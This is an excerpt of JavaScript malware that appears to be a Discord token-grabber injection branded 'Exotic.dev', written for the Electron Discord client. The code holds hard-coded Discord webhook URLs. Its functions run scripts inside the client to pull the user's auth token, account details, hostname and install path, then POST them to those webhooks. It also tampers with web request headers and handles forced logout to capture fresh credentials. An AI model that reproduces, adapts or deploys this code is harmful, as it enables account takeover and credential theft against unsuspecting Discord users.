...
var pphood = "https://discord.com/api/webhooks/967222427430060042/RRBQeYCne8Tq8HIxIGPVKIipbyV0m0y7p_cTWkRxz_MzG06wpJ0gO4Fh5_nutTAj9cK8";
var pphood2 = "https://discord.com/api/webhooks/967222427430060042/RRBQeYCne8Tq8HIxIGPVKIipbyV0m0y7p_cTWkRxz_MzG06wpJ0gO4Fh5_nutTAj9cK8";
...
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(pphood)) {
...
function SeundTopphood2(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${pphood2}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}
function SeedndTofykyren(token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
					...
					SeundTopphood2(JSON.stringify(params))
	})
}
...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
		if (config['init-notify'] == "true") {
			if (fs.existsSync(path.join(__dirname, "init"))) {
				...
				if (token == null || token == undefined || token == "") {
					...
					SeundTopphood(JSON.stringify(c));
				} else {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.Exotic.dev.to/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
		...
		if (!fs.existsSync(path.join(__dirname, "Exotic.dev"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "Exotic.dev"));
		if (config.logout != "false" || config.logout == "%LOGOUT%") {
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "u") {
					var c = {
						username: "Exotic.dev",
						content: "",
						embeds: [{
...
function SeundTopphood(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${pphood}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							SeundTopphood(JSON.stringify(params))
